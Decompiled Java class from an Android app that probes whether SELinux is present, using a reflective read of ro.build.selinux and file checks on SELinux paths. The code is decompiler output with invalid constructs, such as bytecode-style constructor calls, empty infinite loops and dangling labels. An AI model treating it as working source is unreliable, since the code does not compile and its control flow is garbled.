package com.vvt.ad;

import android.os.Build.VERSION;
import com.vvt.ag.b;
import java.io.File;
import java.lang.reflect.Method;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static boolean a()
  {
    boolean bool1 = false;
    int i = Build.VERSION.SDK_INT;
    int j = 17;
    if (i >= j)
    {
      bool2 = b();
      if (!bool2)
      {
        bool2 = c();
        if (!bool2)
        {
          bool2 = d();
          if (!bool2)
          {
            bool2 = com.vvt.aa.a.d();
            if (!bool2) {
              break label48;
            }
          }
        }
      }
      bool1 = true;
    }
    label48:
    boolean bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private static boolean b()
  {
    boolean bool1 = false;
    Object localObject1 = "android.os.SystemProperties";
    for (;;)
    {
      try
      {
        localObject1 = Class.forName((String)localObject1);
        Object localObject3 = "get";
        int i = 1;
        Object localObject4 = new Class[i];
        Object localObject5 = String.class;
        localObject4[0] = localObject5;
        localObject3 = ((Class)localObject1).getMethod((String)localObject3, (Class[])localObject4);
        i = 1;
        localObject4 = new Object[i];
        localObject5 = "ro.build.selinux";
        localObject4[0] = localObject5;
        localObject1 = ((Method)localObject3).invoke(localObject1, (Object[])localObject4);
        localObject1 = (String)localObject1;
        bool2 = b.a((String)localObject1);
      }
      catch (Exception localException1)
      {
        boolean bool2 = false;
        Object localObject2 = null;
        continue;
      }
      try
      {
        bool1 = a;
        if (!bool1) {}
      }
      catch (Exception localException2) {}
    }
    return bool2;
  }
  
  private static boolean c()
  {
    boolean bool1 = false;
    try
    {
      File localFile = new java/io/File;
      String str = "/sys/fs/selinux/enforce";
      localFile.<init>(str);
      bool1 = localFile.exists();
    }
    catch (Exception localException)
    {
      boolean bool2;
      for (;;) {}
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private static boolean d()
  {
    boolean bool1 = false;
    try
    {
      File localFile = new java/io/File;
      String str = "/system/bin/getenforce";
      localFile.<init>(str);
      bool1 = localFile.exists();
    }
    finally
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ad/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */